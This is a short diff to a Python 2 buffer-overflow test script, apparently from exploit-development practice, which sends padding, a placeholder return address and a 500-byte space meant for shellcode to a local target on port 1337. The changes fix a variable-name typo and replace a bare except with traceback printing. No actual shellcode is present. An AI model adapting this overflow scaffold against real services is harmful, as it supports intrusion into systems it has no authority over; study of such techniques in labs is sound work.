@@ -1,6 +1,6 @@
 #!/usr/bin/python
 import socket
-import sys
+import traceback
 
 targetIP = "192.168.1.1"
 targetPort = 1337
@@ -10,7 +10,7 @@ eipOffset = 1000
 try:
   print "\nSending shellcode space test..."
   
-  prefill = "A" * eipoffset
+  prefill = "A" * eipOffset
   eip = "X" * 4
   bufferfill = "B" * (bufferSize - len(prefill) - len(eip))
   shellcodeSpace = "C" * 500
@@ -24,6 +24,5 @@ try:
 
   print "\nDone!"
   
-except:
-  print "\nUh-oh, could not connect to target %s on port %d!" % (targetIP, targetPort)
-  sys.exit()
+except Exception:
+  traceback.print_exc()
